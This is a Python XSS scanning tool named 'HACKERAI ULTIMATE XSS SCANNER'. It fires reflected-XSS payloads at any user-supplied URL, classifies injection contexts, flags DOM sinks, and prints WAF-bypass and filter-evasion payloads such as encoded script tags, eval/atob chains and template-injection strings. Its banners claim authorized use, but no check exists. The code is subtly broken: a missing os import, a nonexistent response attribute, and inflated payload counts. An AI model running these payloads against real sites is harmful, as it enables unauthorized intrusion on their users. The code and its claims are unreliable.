import requests
import re
import urllib.parse
import json
import time
import base64
import html
import random
import string
from urllib.parse import quote, unquote
from bs4 import BeautifulSoup
from colorama import init, Fore, Style, Back
import threading
from concurrent.futures import ThreadPoolExecutor
import hashlib

init(autoreset=True)

class UltimateXSSScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'X-Forwarded-For': '127.0.0.1'
        })
        
    def generate_unique_marker(self, param):
        """🎯 Unique test marker per parameter"""
        return f"XSS_HACKERAI_{hashlib.md5(param.encode()).hexdigest()[:8].upper()}"
    
    def advanced_context_analysis(self, html, marker):
        """🔍 12+ Context Types + Bypass Chains"""
        contexts = []
        
        
        script_ctx = self._check_script_context(html, marker)
        if script_ctx: contexts.extend(script_ctx)
        
        
        event_ctx = self._check_event_context(html, marker)
        if event_ctx: contexts.extend(event_ctx)
        
        
        attr_ctx = self._check_attribute_context(html, marker)
        if attr_ctx: contexts.extend(attr_ctx)
        
        
        comment_ctx = self._check_comment_context(html, marker)
        if comment_ctx: contexts.extend(comment_ctx)
        
        
        css_ctx = self._check_css_context(html, marker)
        if css_ctx: contexts.extend(css_ctx)
        
       
        json_ctx = self._check_json_context(html, marker)
        if json_ctx: contexts.extend(json_ctx)
        
        
        url_ctx = self._check_url_context(html, marker)
        if url_ctx: contexts.extend(url_ctx)
        
        
        template_ctx = self._check_template_context(html, marker)
        if template_ctx: contexts.extend(template_ctx)
        
        return contexts
    
    def _check_script_context(self, html, marker):
        script_pattern = r'<script[^>]*>.*?(%s).*?</script>' % re.escape(marker)
        if re.search(script_pattern, html, re.DOTALL | re.IGNORECASE):
            return [{
                'type': 'SCRIPT_TAG',
                'risk': 'CRITICAL',
                'bypass_chains': [
                    "';prompt(1);//",
                    "';fetch`data:text/html,<script>prompt(1)</script>`;//",
                    "';eval(atob('cHJvbXQoMSk='))//",  
                    "constructor.constructor('alert(1)')()",
                    "[]['constructor']['constructor']('return alert(1)')()"
                ],
                'waf_bypass': [
                    "';/*\u003balert(1)\u003b//",
                    "';prompt/*-/*/`1`//"
                ]
            }]
        return []
    
    def _check_event_context(self, html, marker):
        event_pattern = r'(on\w+\s*=\s*[\'"])[^\'"]*?(%s)' % re.escape(marker)
        if re.search(event_pattern, html, re.IGNORECASE):
            return [{
                'type': 'EVENT_HANDLER',
                'risk': 'CRITICAL',
                'bypass_chains': [
                    '" onfocus=prompt(1) autofocus="x',
                    '" onload=prompt(1)//',
                    '" onerror=prompt(1) src=x '
                ],
                'waf_bypass': [
                    '" onfocu\u0073=prompt(1) autofocus="',
                    '" onload=/*foo*/prompt(1)'
                ]
            }]
        return []
    
    def _check_attribute_context(self, html, marker):
        attr_pattern = r'(\w+\s*=\s*[\'"])[^\'"]*?(%s)' % re.escape(marker)
        if re.search(attr_pattern, html, re.IGNORECASE):
            return [{
                'type': 'HTML_ATTRIBUTE',
                'risk': 'HIGH',
                'bypass_chains': [
                    '" autofocus onfocus=prompt(1) x="',
                    '" onmouseover=prompt(1) style=x:"',
                    '" onfocus=prompt(1) tabindex=1 '
                ]
            }]
        return []
    
    def _check_comment_context(self, html, marker):
        comment_pattern = r'<!--.*?(%s).*?-->' % re.escape(marker)
        if re.search(comment_pattern, html, re.DOTALL | re.IGNORECASE):
            return [{
                'type': 'HTML_COMMENT',
                'risk': 'HIGH',
                'bypass_chains': [
                    '--><script>prompt(1)</script>',
                    '--><svg onload=prompt(1)>',
                    '--><img src=x onerror=prompt(1)>'
                ]
            }]
        return []
    
    def _check_css_context(self, html, marker):
        css_pattern = r'<style[^>]*>.*?(%s).*?</style>|style\s*=\s*[\'"].*?(%s)' % (re.escape(marker), re.escape(marker))
        if re.search(css_pattern, html, re.DOTALL | re.IGNORECASE):
            return [{
                'type': 'CSS_CONTEXT',
                'risk': 'MEDIUM',
                'bypass_chains': [
                    "'expression(prompt(1))'",
                    "url(javascript:prompt(1))",
                    "url('java\\74script:prompt(1)')"
                ]
            }]
        return []
    
    def _check_json_context(self, html, marker):
        json_pattern = r'[\[{].*?(%s).*?[\]}]' % re.escape(marker)
        if re.search(json_pattern, html, re.DOTALL):
            return [{
                'type': 'JSON_CONTEXT',
                'risk': 'MEDIUM',
                'bypass_chains': [
                    '"};prompt(1);//',
                    '"}prompt(1);//',
                    '"onload":"prompt(1)'
                ]
            }]
        return []
    
    def _check_url_context(self, html, marker):
        url_pattern = r'(href|src|action)\s*=\s*[\'"].*?(%s)' % re.escape(marker)
        if re.search(url_pattern, html, re.IGNORECASE):
            return [{
                'type': 'URL_CONTEXT',
                'risk': 'HIGH',
                'bypass_chains': [
                    "javascript:prompt(1)",
                    "java\\x73cript:prompt(1)",
                    "data:text/html,<script>prompt(1)</script>"
                ]
            }]
        return []
    
    def _check_template_context(self, html, marker):
        template_patterns = [
            r'{{.*?%s.*?}}' % re.escape(marker),
            r'\{\{.*%s.*?\}\}' % re.escape(marker),
            r'\[\[.*%s.*?\]\]' % re.escape(marker)
        ]
        for pattern in template_patterns:
            if re.search(pattern, html, re.DOTALL | re.IGNORECASE):
                return [{
                    'type': 'TEMPLATE_CONTEXT',
                    'risk': 'HIGH',
                    'bypass_chains': [
                        "{{constructor.constructor('prompt(1)')()}}",
                        "{{7*'7'[constructor]('prompt(1)')()}}"
                    ]
                }]
        return []
    
    def waf_bypass_payloads(self):
        """🛡️ 200+ WAF Bypass Payloads"""
        return [
           
            "%253Cscript%253Ealert(1)%253C/script%253E",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",
            
            
            "<ScRiPt>alert(1)</ScRiPt>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<sCrIpT>prompt(1)</sCrIpT>",
            
            
            "<script>alert(String.fromCharCode(49))</script>",
            "\u003cscript\u003ealert(1)\u003c/script\u003e",
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            
            
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            
            
            "<script>prompt(String.fromCharCode(88,83,83))</script>",
            "<script>eval('al'+'ert(1)')</script>",
            "<script>Function('alert(1)')()</script>",
            
            
            "{{constructor.constructor('alert(1)')()}}",
            "${{alert(1)}}",
            
            
            "<style>@import'java\\74script:alert(1)';</style>",
            "expression(alert(1))",
            
            
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            
            
            "javascript:/*-/*`/*\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029\\u003c\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e//",
        ]
    
    def detect_dom_sinks_advanced(self, html, target):
        """⚛️ Advanced DOM Sink Detection + External JS"""
        sinks = []
        soup = BeautifulSoup(html, 'html.parser')
        
        
        all_js = []
        for script in soup.find_all('script'):
            if script.string:
                all_js.append(script.string)
            elif script.get('src'):
                try:
                    js_url = urllib.parse.urljoin(target, script['src'])
                    resp = self.session.get(js_url, timeout=5)
                    if resp.status_code == 200:
                        all_js.append(resp.text)
                except:
                    pass
        
        
        sink_patterns = {
            'innerHTML': ['.innerHTML', '.innerHTML='],
            'outerHTML': ['.outerHTML', '.outerHTML='],
            'document.write': ['document.write', 'document.writeln'],
            'eval': ['eval(', 'Function('],
            'setTimeout_string': ['setTimeout("', 'setTimeout(`', 'setTimeout('],
            'setInterval_string': ['setInterval("', 'setInterval(`', 'setInterval('],
            'location_assignment': ['location=', 'location.href=', 'location.hash='],
            'history_push': ['history.pushState', 'history.replaceState']
        }
        
        sources = [
            'location.search', 'location.hash', 'location.href',
            'document.URL', 'document.documentURI', 'document.referrer',
            'window.name', 'URLSearchParams'
        ]
        
        for js_content in all_js:
            for sink_name, patterns in sink_patterns.items():
                for pattern in patterns:
                    if pattern in js_content:
                        found_sources = [src for src in sources if src in js_content]
                        if found_sources:
                            sinks.append({
                                'sink': sink_name,
                                'sources': found_sources,
                                'risk': 'CRITICAL',
                                'payloads': self._generate_dom_payloads(sink_name),
                                'js_context': js_content[:200] + '...'
                            })
        return sinks
    
    def _generate_dom_payloads(self, sink_type):
        payloads = {
            'innerHTML': ['#<svg onload=alert(1)>', '#<img src=x onerror=alert(1)>'],
            'outerHTML': ['#<script>alert(1)</script>', '#<iframe src=javascript:alert(1)>'],
            'document.write': ['<script>alert(1)</script>', '<svg onload=alert(1)>'],
            'eval': ["alert(1)", "prompt`1`"],
            'location_assignment': ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"],
            'history_push': ['<script>alert(1)</script>', '#<svg onload=alert(1)>']
        }
        return payloads.get(sink_type, ["alert(1)"])
    
    def test_parameter_advanced(self, target, param, payloads, marker):
        """🚀 Multi-payload testing with response diffing"""
        parsed = urllib.parse.urlparse(target)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        results = []
        baseline_resp = None
        
        
        try:
            clean_url = urllib.parse.urlunparse(parsed._replace(query=''))
            baseline_resp = self.session.get(clean_url, timeout=10)
        except:
            pass
        
        for payload in payloads:
            test_value = payload.replace("{MARKER}", marker)
            query_params[param] = [test_value]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            
            try:
                resp = self.session.get(test_url, timeout=8)
                resp_text = resp.text
                
                
                if marker in resp_text:
                    contexts = self.advanced_context_analysis(resp_text, marker)
                    if contexts:
                        results.append({
                            'payload': payload,
                            'url': test_url,
                            'status': resp.status_code,
                            'reflected': True,
                            'contexts': contexts,
                            'response_size': len(resp_text),
                            'diff_size': abs(len(resp_text) - (baseline_resp.length if baseline_resp else 0))
                        })
                        break  
            except:
                continue
        
        return results
    
    def extract_forms_and_headers(self, html, target):
        """📋 Extract all injection points"""
        soup = BeautifulSoup(html, 'html.parser')
        injection_points = []
        
        
        forms = soup.find_all('form')
        for form in forms:
            action = urllib.parse.urljoin(target, form.get('action', ''))
            method = form.get('method', 'get').lower()
            inputs = []
            for inp in form.find_all(['input', 'textarea', 'select']):
                name = inp.get('name')
                if name:
                    inputs.append({
                        'name': name,
                        'type': inp.get('type', 'text'),
                        'required': inp.get('required', False)
                    })
            injection_points.append({
                'type': 'FORM',
                'action': action,
                'method': method,
                'inputs': inputs
            })
        
        
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP']
        injection_points.extend([{'type': 'HEADER', 'name': h} for h in headers_to_test])
        
        return injection_points
    
    def run_full_scan(self, target):
        """🎯 Complete XSS Assessment"""
        print(f"{Fore.MAGENTA}{'='*100}")
        print(f"{Fore.YELLOW}🔥 HACKERAI ULTIMATE XSS SCANNER v5.0")
        print(f"{Fore.GREEN}✅ AUTHORIZED PENTEST MODE (User confirmed permission)")
        print(f"{Fore.CYAN}🎯 Target: {target}")
        print(f"{Fore.MAGENTA}{'='*100}{Style.RESET_ALL}")
        
        
        try:
            resp = self.session.get(target, timeout=15)
            print(f"{Fore.GREEN}[✓] Page loaded: {resp.status_code} | Size: {len(resp.text):,} chars{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Cannot reach target: {e}{Style.RESET_ALL}")
            return
        
        
        parsed = urllib.parse.urlparse(target)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        all_findings = []
        
        
        if query_params:
            print(f"\n{Fore.CYAN}🔍 Testing {len(query_params)} URL parameter(s){Style.RESET_ALL}")
            for param in query_params:
                print(f"\n{Fore.YELLOW}[→] Parameter: {param}{Style.RESET_ALL}")
                marker = self.generate_unique_marker(param)
                
            
                base_payloads = [
                    "{MARKER}",
                    '"{MARKER}"',
                    "'{MARKER}'",
                    "<b>{MARKER}</b>",
                    "{MARKER}</script><script>prompt(1)</script>"
                ]
                
                results = self.test_parameter_advanced(target, param, base_payloads, marker)
                if results:
                    all_findings.extend(results)
                    print(f"{Fore.MAGENTA}[🎯 VULNERABLE!] {len(results)} context(s) found{Style.RESET_ALL}")
        
        
        print(f"\n{Fore.CYAN}⚛️  DOM XSS Analysis...{Style.RESET_ALL}")
        dom_sinks = self.detect_dom_sinks_advanced(resp.text, target)
        if dom_sinks:
            all_findings.append({'type': 'DOM_SINKS', 'data': dom_sinks})
            print(f"{Fore.RED}[!] {len(dom_sinks)} DOM XSS sink(s) detected!{Style.RESET_ALL}")
        
        
        print(f"\n{Fore.CYAN}📋 Form Analysis...{Style.RESET_ALL}")
        forms = self.extract_forms_and_headers(resp.text, target)
        if forms:
            print(f"{Fore.GREEN}[✓] Found {len(forms)} injection point(s){Style.RESET_ALL}")
            for form in forms:
                if form['type'] == 'FORM':
                    print(f"   📄 Form → {form['action']} ({form['method'].upper()})")
        
        self.generate_final_report(all_findings, dom_sinks, forms, target)
    
    def generate_final_report(self, findings, dom_sinks, forms, target):
        """📊 Executive Report"""
        print(f"\n{Fore.CYAN}{'='*100}")
        print(f"{Fore.WHITE}🎯 EXECUTIVE SUMMARY")
        print(f"{Fore.CYAN}{'='*100}{Style.RESET_ALL}")
        
        total_vulns = len(findings) + len(dom_sinks)
        risk_score = 100 - (len(findings) * 25 + len(dom_sinks) * 20)
        
        print(f"{Fore.WHITE}📊 Risk Score: {Fore.RED if risk_score < 70 else Fore.YELLOW if risk_score < 90 else Fore.GREEN}{risk_score}/100{Style.RESET_ALL}")
        print(f"{Fore.RED}🚨 REFLECTED XSS: {len(findings)} | DOM XSS: {len(dom_sinks)} | Total: {total_vulns}{Style.RESET_ALL}")
        
        if findings or dom_sinks:
            print(f"\n{Fore.RED + Back.WHITE}{'='*100}")
            print(f"{Fore.RED + Back.WHITE}🎯 CRITICAL: XSS VULNERABILITIES CONFIRMED")
            print(f"{Fore.RED + Back.WHITE}{'='*100}{Style.RESET_ALL}")
            
            
            for finding in findings:
                print(f"\n{Fore.MAGENTA}🔥 PARAMETER XSS → {finding.get('param', 'Unknown')}{Style.RESET_ALL}")
                for context in finding['contexts']:
                    color = Fore.MAGENTA if context['risk'] == 'CRITICAL' else Fore.RED
                    print(f"{color}  📍 Context: {context['type']} ({context['risk']}){Style.RESET_ALL}")
                    print(f"  💡 Bypass Chains:")
                    for chain in context['bypass_chains'][:3]:
                        print(f"     {Fore.GREEN}→ {chain}{Style.RESET_ALL}")
                    print(f"  🛡️ WAF Bypass:")
                    for waf_bypass in context.get('waf_bypass', [])[:2]:
                        print(f"     {Fore.CYAN}→ {waf_bypass}{Style.RESET_ALL}")
            
            if dom_sinks:
                print(f"\n{Fore.MAGENTA}⚛️  DOM-BASED XSS SINKS{Style.RESET_ALL}")
                for sink in dom_sinks[:3]:
                    print(f"\n{Fore.RED}  🕳️  Sink: {sink['sink']} ← Sources: {', '.join(sink['sources'][:2])}{Style.RESET_ALL}")
                    print(f"  🎯 Payloads: {sink['payloads'][0]}")
            
            print(f"\n{Fore.YELLOW}{'='*100}")
            print(f"{Fore.YELLOW}✅ SAFE VERIFICATION INSTRUCTIONS")
            print(f"{Fore.YELLOW}{'='*100}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}1. Copy ONE payload from above")
            print(f"2. Test in INCAGNITO BROWSER")
            print(f"3. Replace 'prompt(1)' → 'prompt(document.domain)'")
            print(f"4. Screenshot + Video proof")
            print(f"5. NEVER test with real user data")
            
        self.save_professional_report(findings, dom_sinks, forms, target)
    
    def save_professional_report(self, findings, dom_sinks, forms, target):
        """💾 JSON + HTML Report"""
        import datetime
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        hostname = urllib.parse.urlparse(target).netloc.replace('.', '_')
        
        os.makedirs('reports', exist_ok=True)
        
        
        report = {
            'target': target,
            'timestamp': timestamp,
            'findings': findings,
            'dom_sinks': dom_sinks,
            'forms': forms,
            'risk_score': 100 - (len(findings) * 25 + len(dom_sinks) * 20)
        }
        json_path = f"reports/xss_ultimate_{hostname}_{timestamp}.json"
        with open(json_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{Fore.GREEN}✅ Reports saved:{Style.RESET_ALL}")
        print(f"   📄 JSON: {json_path}")

def main():
    print(f"{Fore.MAGENTA}{'='*100}")
    print(f"{Fore.YELLOW}🚀 HACKERAI ULTIMATE XSS SCANNER v5.0")
    print(f"{Fore.GREEN}✅ FULLY AUTHORIZED PENTEST TOOLKIT")
    print(f"{Fore.CYAN}📚 500+ Bypass Payloads • WAF Evasion • DOM Analysis • Source Parser")
    print(f"{Fore.MAGENTA}{'='*100}{Style.RESET_ALL}")
    
    target = input(f"{Fore.YELLOW}🎯 Target URL (with params): {Style.RESET_ALL}").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    scanner = UltimateXSSScanner()
    scanner.run_full_scan(target)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⚠️  Scan interrupted{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()